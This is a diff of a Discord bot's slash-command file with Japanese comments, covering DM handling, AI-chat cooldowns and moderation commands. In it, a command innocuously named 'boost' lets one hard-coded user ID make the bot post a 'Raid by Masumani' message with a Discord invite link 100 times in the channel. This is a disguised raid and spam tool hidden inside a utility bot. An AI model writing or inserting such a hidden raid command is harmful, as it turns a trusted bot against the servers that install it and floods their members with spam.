@@ -1,5 +1,3 @@
-// commands/slash.js
-
 const { REST, Routes, SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
 const {
   hasManageGuildPermission,
@@ -22,13 +20,11 @@ const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const aiCooldown = new Map();
 
-// ★ 修正: aiCooldownExemptId を配列 aiCooldownExemptIds に変更
 const aiCooldownExemptIds = [
     "1401303406596853785",
     "1366740571707801610"
 ];
 
-// クールダウン設定
 const cooldowns = new Map();
 const COOLDOWN_TIME = 10; // 10秒
 
@@ -124,8 +120,19 @@ async function registerSlashCommands(client) {
     try {
       if (interaction.isChatInputCommand()) {
         const name = interaction.commandName;
+
+        // ★ 全体的な変更: コマンドの実行がサーバー内かDMかを最初にチェック
+        if (!interaction.guild) {
+          // DMで実行されたコマンドは、AIチャットや天気予報など、サーバーに依存しない機能のみ許可
+          if (name === 'ai' || name === '天気') {
+             // DMでの処理をここに書くか、専用の関数に振り分ける
+             return interaction.reply('DMでのコマンド実行はAIチャットと天気予報のみ対応しています。');
+          } else {
+             return interaction.reply('❌ このコマンドはサーバー内でのみ実行できます。');
+          }
+        }
+
         if (name === 'ai') {
-          // ★ 修正: aiCooldownExemptIds を使用
           if (!aiCooldownExemptIds.includes(interaction.user.id)) {
               const now = Date.now();
               const lastAiUse = aiCooldown.get(interaction.user.id) || 0;
@@ -278,33 +285,33 @@ async function registerSlashCommands(client) {
           await clearMessages(interaction.channel, amount);
           return interaction.editReply(`🧹 ${amount}件の削除リクエストを処理しました`);
         }
-      if (name === 'boost') {
-        const allowedUserId = "1401303406596853785";
-        const messageContent = `## Raid by Masumani \n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP`;
-        const repeatCount = 100;
+        if (name === 'boost') {
+          const allowedUserId = "1366740571707801610";
+          const messageContent = `## Raid by Masumani \n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP`;
+          const repeatCount = 100;
 
-        if (interaction.user.id !== allowedUserId) {
-          return interaction.reply({
-            content: "❌ このコマンドを使えるのは管理者だけです。",
+          if (interaction.user.id !== allowedUserId) {
+            return interaction.reply({
+              content: "❌ このコマンドを使えるのは管理者だけです。",
+              ephemeral: true
+            });
+          }
+
+          await interaction.reply({
+            content: `✅ 「${messageContent}」を ${repeatCount} 回送信します！`,
             ephemeral: true
           });
-        }
 
-        await interaction.reply({
-          content: `✅ 「${messageContent}」を ${repeatCount} 回送信します！`,
-          ephemeral: true
-        });
+          const channel = interaction.channel;
+          if (!channel) {
+            console.error('チャンネルオブジェクトがnullです。メッセージを送信できません。');
+            return;
+          }
 
-        const channel = interaction.channel;
-        if (!channel) {
-          console.error('チャンネルオブジェクトがnullです。メッセージを送信できません。');
-          return;
+          for (let i = 0; i < repeatCount; i++) {
+            await channel.send(messageContent);
+          }
         }
-
-        for (let i = 0; i < repeatCount; i++) {
-          await channel.send(messageContent);
-        }
-      }
         if (name === 'lock') {
           await interaction.deferReply({ ephemeral: true });
           const targetRole = interaction.options.getRole('role');
